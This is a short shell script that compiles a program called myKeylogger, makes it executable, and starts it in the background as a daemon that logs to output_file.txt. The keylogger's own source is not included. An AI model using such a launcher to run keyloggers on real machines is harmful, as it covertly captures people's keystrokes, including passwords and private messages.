#!/bin/sh

#Scipt to make the program and run it as a daemon 
#stores the result in ouput_file.txt 

make     myKeylogger
chmod +x myKeylogger

(./myKeylogger output_file.txt ) & exit ;
